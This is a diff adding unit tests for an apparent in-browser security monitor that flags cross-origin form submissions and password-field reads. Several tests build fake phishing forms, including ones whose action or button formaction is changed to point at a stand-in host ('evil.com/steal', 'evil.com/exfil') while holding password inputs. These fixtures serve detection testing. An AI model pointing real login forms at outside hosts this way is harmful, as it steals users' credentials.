@@ -75,6 +75,12 @@ describe("isCrossOriginUrl", () => {
   it("returns true for different port", () => {
     expect(isCrossOriginUrl("http://localhost:9999/path")).toBe(true);
   });
+
+  it("returns false for opaque and script-like schemes", () => {
+    expect(isCrossOriginUrl("data:text/html,<form></form>")).toBe(false);
+    expect(isCrossOriginUrl("javascript:void(0)")).toBe(false);
+    expect(isCrossOriginUrl("blob:https://example.com/id")).toBe(false);
+  });
 });
 
 describe("extractOrigin", () => {
@@ -94,6 +100,12 @@ describe("extractOrigin", () => {
   it("handles URL that resolves to current origin", () => {
     // ":::invalid" is treated as a relative path by URL constructor
     expect(extractOrigin(":::invalid")).toBe(location.origin);
+  });
+
+  it("returns empty for opaque and script-like schemes", () => {
+    expect(extractOrigin("data:text/html,<form></form>")).toBe("");
+    expect(extractOrigin("javascript:void(0)")).toBe("");
+    expect(extractOrigin("blob:https://example.com/id")).toBe("");
   });
 });
 
@@ -204,11 +216,11 @@ describe("initJsBehaviorMonitor form submit detection", () => {
 
   it("emits signal for non-credential form with dynamically changed action", () => {
     const postSignal = vi.fn();
-    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
-
     const form = document.createElement("form");
     form.setAttribute("action", "/safe-endpoint");
     document.body.appendChild(form);
+
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
 
     // Dynamically change the action to a cross-origin URL
     form.action = "https://evil.com/exfil";
@@ -221,6 +233,61 @@ describe("initJsBehaviorMonitor form submit detection", () => {
         actionDynamicallyChanged: true,
       })
     );
+  });
+
+  it("does not mark an unobserved initial cross-origin action as dynamic", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.setAttribute("action", "https://payments.example/submit");
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new Event("submit", { bubbles: true }));
+
+    expect(postSignal).not.toHaveBeenCalled();
+  });
+
+  it("uses submitter formaction as the effective destination", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.action = "/login";
+    const pw = document.createElement("input");
+    pw.type = "password";
+    const button = document.createElement("button");
+    button.type = "submit";
+    button.setAttribute("formaction", "https://evil.com/steal");
+    form.append(pw, button);
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new SubmitEvent("submit", { bubbles: true, submitter: button }));
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-form-submit-suspicious",
+      expect.objectContaining({
+        isCrossOrigin: true,
+        destinationOrigin: "https://evil.com",
+      })
+    );
+  });
+
+  it("does not stack submit listeners when initialized twice", () => {
+    const postSignal = vi.fn();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.action = "https://evil.com/steal";
+    const pw = document.createElement("input");
+    pw.type = "password";
+    form.appendChild(pw);
+    document.body.appendChild(form);
+
+    form.dispatchEvent(new Event("submit", { bubbles: true }));
+
+    expect(postSignal).toHaveBeenCalledTimes(1);
   });
 });
 
@@ -285,6 +352,24 @@ describe("credential field value monitoring", () => {
         isInsideSubmitHandler: false,
         fieldCount: 1,
       })
+    );
+  });
+
+  it("returns password values even when signal emission throws", () => {
+    const postSignal = vi.fn(() => {
+      throw new Error("bridge unavailable");
+    });
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const input = document.createElement("input");
+    input.type = "password";
+    input.value = "secret123";
+    document.body.appendChild(input);
+
+    expect(input.value).toBe("secret123");
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-credential-read",
+      expect.anything()
     );
   });
 
